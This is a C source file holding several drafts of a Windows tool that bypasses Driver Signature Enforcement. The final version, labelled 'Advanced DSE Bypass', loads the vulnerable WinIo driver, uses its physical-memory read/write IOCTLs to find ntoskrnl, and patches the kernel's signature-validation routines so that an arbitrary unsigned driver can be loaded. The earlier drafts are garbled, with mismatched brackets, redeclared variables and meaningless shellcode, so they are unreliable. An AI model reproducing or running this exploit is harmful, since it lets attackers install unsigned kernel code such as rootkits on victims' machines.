/*#include <windows.h>
#include <winternl.h>

typedef NTSYSAPI NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct BASE_MODULE_ENTRY {
    ULONG Unknown1;
    ULONG Unknown2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT NameLength;
    USHORT NameOffset;
} BASE_MODULE_ENTRY, *PBASE_MODULE_ENTRY;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    BASE_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

int main() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    LPVOID LoadLibraryAAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    LPVOID GetProcAddressAddr = GetProcAddress(hKernel32, "GetProcAddress");
    LPVOID RegOpenKeyExAAddr = GetProcAddress(hAdvapi32, "RegOpenKeyExA");
    LPVOID RegQueryValueExAAddr = GetProcAddress(hAdvapi32, "RegQueryValueExA");
    LPVOID RegCloseKeyAddr = GetProcAddress(hAdvapi32, "RegCloseKey");
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    HKEY hKey;
    DWORD dwType, dwSize = sizeof(DWORD);
    DWORD dwData;

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", 0, KEY_QUERY_VALUE, &hKey);
    RegQueryValueExA(hKey, "DisablePagingExecutive", NULL, &dwType, (LPBYTE)&dwData, &dwSize);
    RegCloseKey(hKey);

    SYSTEM_MODULE_INFORMATION smi;
    ULONG returnLength;

    NtQuerySystemInformation(11, &smi, sizeof(smi), &returnLength);
    PVOID ntoskrnlBase = smi.Module[0].ImageBase;

    BYTE shellcode[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x48, 0x8B, 0x10, 
        0x48, 0x05, 0x07, 0x00, 0x00, 0x00, 
        0x48, 0x89, 0x10 
    };

    BYTE pattern[] = { 0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC1, 0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x48, 0x33, 0xC0, 0xF6, 0xC1, 0x01 };

    for (DWORD i = 0; i < smi.Module[0].ImageSize - sizeof(pattern); i++) {
        if (memcmp((PVOID)((ULONG_PTR)ntoskrnlBase + i), pattern, sizeof(pattern)) == 0) {
            memcpy(&shellcode[2], (PVOID)((ULONG_PTR)ntoskrnlBase + i), sizeof(PVOID));
            break;
        }
    }

    LPVOID shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(shellcodeAddr, shellcode, sizeof(shellcode));

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}*/

/////////////////////

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#define SystemModuleInformation 11

typedef NTSYSAPI NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct BASE_MODULE_ENTRY {
    ULONG Unknown1;
    ULONG Unknown2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT NameLength;
    USHORT NameOffset;
} BASE_MODULE_ENTRY, *PBASE_MODULE_ENTRY;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    BASE_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

int main() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    LPVOID LoadLibraryAAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    LPVOID GetProcAddressAddr = GetProcAddress(hKernel32, "GetProcAddress");
    LPVOID RegOpenKeyExAAddr = GetProcAddress(hAdvapi32, "RegOpenKeyExA");
    LPVOID RegQueryValueExAAddr = GetProcAddress(hAdvapi32, "RegQueryValueExA");
    LPVOID RegCloseKeyAddr = GetProcAddress(hAdvapi32, "RegCloseKey");
    LPVOID RegSetValueExAAddr = GetProcAddress(hAdvapi32, "RegSetValueExA");
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (!LoadLibraryAAddr || !GetProcAddressAddr || !RegOpenKeyExAAddr || !RegQueryValueExAAddr || !RegCloseKeyAddr || !RegSetValueExAAddr || !NtQuerySystemInformation) {
        printf("Failed to get function addresses\n");
        return -1;
    }

    HKEY hKey;
    DWORD dwData = 1;
    DWORD dwSize = sizeof(DWORD);

    if (((BOOL(WINAPI*)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY))RegOpenKeyExAAddr)(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        printf("Failed to open registry key\n");
        return -1;
    }

    if (((LONG(WINAPI*)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD))RegSetValueExAAddr)(hKey, "DisablePagingExecutive", 0, REG_DWORD, (const BYTE*)&dwData, dwSize) != ERROR_SUCCESS) {
        printf("Failed to set registry value\n");
        ((LONG(WINAPI*)(HKEY))RegCloseKeyAddr)(hKey);
        return -1;
    }

    ((LONG(WINAPI*)(HKEY))RegCloseKeyAddr)(hKey);

    SYSTEM_MODULE_INFORMATION smi;
    ULONG returnLength = 0;

    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, &smi, sizeof(smi), &returnLength);
    if (!NT_SUCCESS(status)) {
        printf("NtQuerySystemInformation failed\n");
        return -1;
    }

    PVOID ntoskrnlBase = smi.Module[0].ImageBase;

    BYTE shellcode[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x48, 0x8B, 0x10,
        0x48, 0x05, 0x07, 0x00, 0x00, 0x00,
        0x48, 0x89, 0x10,
        // Disable DSE
        0xB8, 0xFF, 0xFF, 0xFF, 0xFF,
        // Return address
        0xC3,
};

LPVOID shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (!shellcodeAddr) {
    printf("VirtualAlloc failed\n");
    return -1;
}
memcpy(shellcodeAddr, shellcode, sizeof(shellcode));

HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
if (!hThread) {
    printf("CreateThread failed\n");
    return -1;
}

WaitForSingleObject(hThread, INFINITE);

// Find the ntoskrnl.exe image
PSYSTEM_MODULE_INFORMATION smi;
ULONG returnLength = 0;
NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, &smi, sizeof(smi), &returnLength);
if (!NT_SUCCESS(status)) {
    printf("NtQuerySystemInformation failed\n");
    return -1;

PVOID ntoskrnlBase = smi.Module[0].ImageBase;

// Patch ntoskrnl.exe
DWORD* disableDSE = (DWORD*)((ULONG_PTR)ntoskrnlBase + MmPagingFoundation];
disableDSE[1] = 1; // Disable DSE

// Commit changes
FlushInstructionCache(GetCurrentProcess(), (PVOID)disableDSE,sizeof(DWORD));
}

return 0;
}

/////


============
last version 
============


#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#define SystemModuleInformation 11
#define MmPagingFoundation 0x13B0

typedef NTSYSAPI NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct BASE_MODULE_ENTRY {
    ULONG Unknown1;
    ULONG Unknown2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT NameLength;
    USHORT NameOffset;
} BASE_MODULE_ENTRY, *PBASE_MODULE_ENTRY;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    BASE_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

int main() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    LPVOID LoadLibraryAAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    LPVOID GetProcAddressAddr = GetProcAddress(hKernel32, "GetProcAddress");
    LPVOID RegOpenKeyExAAddr = GetProcAddress(hAdvapi32, "RegOpenKeyExA");
    LPVOID RegQueryValueExAAddr = GetProcAddress(hAdvapi32, "RegQueryValueExA");
    LPVOID RegCloseKeyAddr = GetProcAddress(hAdvapi32, "RegCloseKey");
    LPVOID RegSetValueExAAddr = GetProcAddress(hAdvapi32, "RegSetValueExA");
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (!LoadLibraryAAddr || !GetProcAddressAddr || !RegOpenKeyExAAddr || !RegQueryValueExAAddr || !RegCloseKeyAddr || !RegSetValueExAAddr || !NtQuerySystemInformation) {
        printf("Failed to get function addresses\n");
        return -1;
    }

    HKEY hKey;
    DWORD dwData = 1;
    DWORD dwSize = sizeof(DWORD);

    if (((BOOL(WINAPI*)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY))RegOpenKeyExAAddr)(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        printf("Failed to open registry key\n");
        return -1;
    }

    if (((LONG(WINAPI*)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD))RegSetValueExAAddr)(hKey, "DisablePagingExecutive", 0, REG_DWORD, (const BYTE*)&dwData, dwSize) != ERROR_SUCCESS) {
        printf("Failed to set registry value\n");
        ((LONG(WINAPI*)(HKEY))RegCloseKeyAddr)(hKey);
        return -1;
    }

    ((LONG(WINAPI*)(HKEY))RegCloseKeyAddr)(hKey);

    PSYSTEM_MODULE_INFORMATION smi;
    ULONG returnLength;

    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation , &smi,sizeof(SYSTEM_MODULE_INFORMATION), &returnLength);
    if (!NT_SUCCESS(status)) {
        printf("NtQuerySystemInformation failed\n");
        return -1;
    }

    PVOID ntoskrnlBase = smi->Module[0].ImageBase;

    BYTE shellcode[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x48, 0x8B, 0x10,
        0x48, 0x05, 0x07, 0x00, 0x00, 0x00,
        0x48, 0x89, 0x10,
        // Disable DSE
        0xB8, 0xFF, 0xFF, 0xFF, 0xFF,
        // Return address
        0xC3,
};

LPVOID shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (!shellcodeAddr) {
    printf("VirtualAlloc failed\n");
    return -1;
}
memcpy(shellcodeAddr, shellcode, sizeof(shellcode));

HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
if (!hThread) {
    printf("CreateThread failed\n");
    return -1;
}

WaitForSingleObject(hThread, INFINITE);

// Find the ntoskrnl.exe image
NTSTATUS systemStatus = NtQuerySystemInformation(SystemModuleInformation , (PVOID)&smi,sizeof(SYSTEM_MODULE_INFORMATION), &returnLength);
if (!NT_SUCCESS(systemStatus)) {
printf("NtQuerySystemInformation failed\n");
return -1;

PVOID ntoskrnlBase = smi->Module[0].ImageBase;

// Patch ntoskrnl.exe
DWORD* disableDSE = (DWORD*)((ULONG_PTR)ntoskrnlBase + MmPagingFoundation);
disableDSE[1] = 1; // Disable DSE

// Commit changes
FlushInstructionCache(GetCurrentProcess(), (PVOID)disableDSE,sizeof(DWORD));
HeapFree(GetProcessHeap(), 0, smi);
}

return 0;
}



/////////////////////
// hotest version //
////////////////////

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef unsigned long u32;
typedef unsigned long long u64;

#define IOCTL_MAP 0x80102040
#define IOCTL_UNMAP 0x80102044

#define SEARCH_RANGE 0xBFFFFF
#define DRIVER_NAME_SIZE 16

char original_data_pattern[6] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
char original_header_pattern[6] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

unsigned char data_signature[17] = { 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xD1, 0x48, 0x85, 0xC0 };
unsigned char header_signature[21] = { 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x33, 0xF6 };

char no_op_patch[6] = {
    0xB8, 0x00, 0x00, 0x00, 0x00,  // mov rax, 0
    0xC3  // ret
};

u64 driver_handle = -1;
char driver_path[FILENAME_MAX];

struct packet {
    u64 size;
    u64 phys_addr;
    u64 phys_handle;
    u64 phys_linear;
    u64 phys_section;
};

u64 map_physical_memory(packet* pkt) {
    u32 returned_bytes;
    if (!DeviceIoControl((HANDLE)driver_handle, IOCTL_MAP, pkt, sizeof(packet), pkt, sizeof(packet), &returned_bytes, NULL)) {
        fprintf(stderr, "[ERROR] Failed to map physical memory. Error Code: %lu\n", GetLastError());
        return 0;
    }
    return pkt->phys_linear;
}

int unmap_physical_memory(packet* pkt) {
    u32 returned_bytes;
    if (!DeviceIoControl((HANDLE)driver_handle, IOCTL_UNMAP, pkt, sizeof(packet), NULL, 0, &returned_bytes, NULL)) {
        fprintf(stderr, "[ERROR] Failed to unmap physical memory. Error Code: %lu\n", GetLastError());
        return 0;
    }
    return 1;
}

int read_memory(u64 addr, u64 buf, u64 size) {
    packet pkt;
    pkt.phys_addr = addr;
    pkt.size = size;

    u64 linear_addr = map_physical_memory(&pkt);
    if (linear_addr == 0) return 0;

    if (IsBadReadPtr((void*)linear_addr, 1)) {
        fprintf(stderr, "[ERROR] Bad read pointer at virtual address 0x%llx\n", (u64)linear_addr);
        return 0;
    }

    printf("[INFO] Mapped physical address 0x%llx to virtual address 0x%llx\n", addr, (u64)linear_addr);
    memcpy((void*)buf, (void*)linear_addr, size);

    unmap_physical_memory(&pkt);
    return 1;
}

int write_memory(u64 addr, u64 buf, u64 size) {
    packet pkt;
    pkt.phys_addr = addr;
    pkt.size = size;

    u64 linear_addr = map_physical_memory(&pkt);
    if (linear_addr == 0) return 0;

    if (IsBadReadPtr((void*)linear_addr, 1)) {
        fprintf(stderr, "[ERROR] Bad read pointer at virtual address 0x%llx\n", (u64)linear_addr);
        return 0;
    }

    printf("[INFO] Mapped physical address 0x%llx to virtual address 0x%llx\n", addr, (u64)linear_addr);
    memcpy((void*)linear_addr, (void*)buf, size);

    unmap_physical_memory(&pkt);
    return 1;
}

u64 search_for_pattern(u64 start, u64 range, unsigned char* pattern, size_t pattern_len) {
    u64 buffer = (u64)malloc(range);
    if (buffer == 0) {
        fprintf(stderr, "[ERROR] Memory allocation failed.\n");
        return 0;
    }

    if (!read_memory(start, buffer, range)) {
        free((void*)buffer);
        return 0;
    }

    u64 found_addr = 0;
    for (u64 i = 0; i < range - pattern_len; i++) {
        int match_found = 1;
        for (size_t j = 0; j < pattern_len; j++) {
            if (pattern[j] != 0x00 && *(unsigned char*)(buffer + i + j) != pattern[j]) {
                match_found = 0;
                break;
            }
        }

        if (match_found) {
            found_addr = start + i;
            break;
        }
    }

    free((void*)buffer);
    return found_addr;
}

int check_file_exists(const char* path) {
    DWORD attrs = GetFileAttributesA(path);
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        return 0;
    }
    return !(attrs & FILE_ATTRIBUTE_DIRECTORY);
}

void execute_driver_load(const char* drv_name, const char* bin_path) {
    char create_cmd[256];
    char start_cmd[256];
    snprintf(create_cmd, sizeof(create_cmd), "sc create %s binpath=\"%s\" type=kernel>NUL", drv_name, bin_path);
    snprintf(start_cmd, sizeof(start_cmd), "sc start %s>NUL", drv_name);
    system(create_cmd);
    system(start_cmd);
}

void manage_driver(const char* drv_name, const char* bin_path) {
    // Attempt to load the WinIo driver
    printf("[INFO] Attempting to open handle to WinIo...\n");
    driver_handle = (u64)CreateFileA("\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (driver_handle == (u64)-1) {
        GetCurrentDirectoryA(FILENAME_MAX, driver_path);
        strcat(driver_path, "\\WinIO64.sys");

        if (!check_file_exists(driver_path)) {
            fprintf(stderr, "[ERROR] WinIo driver not found. Ensure 'WinIO64.sys' is in the current directory.\n");
            system("pause>NUL");
            exit(-3);
        }

        system("sc stop winio_dse_hook >NUL");
        system("sc delete winio_dse_hook >NUL");

        execute_driver_load("winio_dse_hook", driver_path);

        driver_handle = (u64)CreateFileA("\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (driver_handle == (u64)-1) {
            fprintf(stderr, "[ERROR] Failed to open handle to WinIo after retry.\n");
            system("pause>NUL");
            exit(-4);
        }
    }
}

int main(int argc, char* argv[]) {
    printf("[*] Advanced DSE Bypass by CodeMaster\n");

    if (argc != 3 || (strlen(argv[1]) < 2 || strlen(argv[2]) < 2)) {
        fprintf(stderr, "[ERROR] Usage: dse_bypass.exe <driver_name> <driver_path>\n");
        Sleep(1000);
        return -1;
    }

    if (!check_file_exists(argv[2])) {
        fprintf(stderr, "[ERROR] Driver file not found.\n");
        system("pause>NUL");
        return -2;
    }

    manage_driver(argv[1], argv[2]);

    printf("[INFO] WinIo handle acquired: %p\n", (void*)driver_handle);

    printf("[INFO] Locating ntoskrnl base...\n");
    u64 ntos_base_pa = 0;
    for (u64 i = 0x000000000; i < 0x200000000; i += 0x000100000) {
        char* buf = (char*)malloc(2);
        if (buf == NULL) {
            fprintf(stderr, "[ERROR] Memory allocation failed.\n");
            return -7;
        }

        if (read_memory(i, (u64)buf, 2)) {
            if (buf[0] == 'M' && buf[1] == 'Z') {
                ntos_base_pa = i;
                printf("[INFO] Found ntoskrnl base at 0x%llx\n", ntos_base_pa);
                free(buf);
                break;
            }
        }
        free(buf);
    }

    if (ntos_base_pa == 0) {
        fprintf(stderr, "[ERROR] Could not locate ntoskrnl base address.\n");
        system("pause>NUL");
        return -5;
    }

    u64 data_pa = search_for_pattern(ntos_base_pa, SEARCH_RANGE, (unsigned char*)&data_signature, sizeof(data_signature));
    u64 header_pa = search_for_pattern(ntos_base_pa, SEARCH_RANGE, (unsigned char*)&header_signature, sizeof(header_signature));
    if (data_pa == 0 || header_pa == 0) {
        fprintf(stderr, "[ERROR] Pattern not found.\n");
        system("pause>NUL");
        return -6;
    }

    read_memory(data_pa, (u64)&original_data_pattern, sizeof(original_data_pattern));
    read_memory(header_pa, (u64)&original_header_pattern, sizeof(original_header_pattern));

    write_memory(data_pa, (u64)&no_op_patch, sizeof(no_op_patch));
    write_memory(header_pa, (u64)&no_op_patch, sizeof(no_op_patch));
    printf("[INFO] Validation routines patched.\n");

    execute_driver_load(argv[1], argv[2]);
    printf("[INFO] Driver loaded successfully.\n");

    write_memory(data_pa, (u64)&original_data_pattern, sizeof(original_data_pattern));
    write_memory(header_pa, (u64)&original_header_pattern, sizeof(original_header_pattern));
    printf("[INFO] Original validation routines restored.\n");

    system("sc stop winio_dse_hook >NUL");
    system("sc delete winio_dse_hook >NUL");
    printf("[INFO] WinIo driver unloaded.\n");

    printf("[INFO] Operation completed.\n");
    Sleep(1000);
    return 0;
}
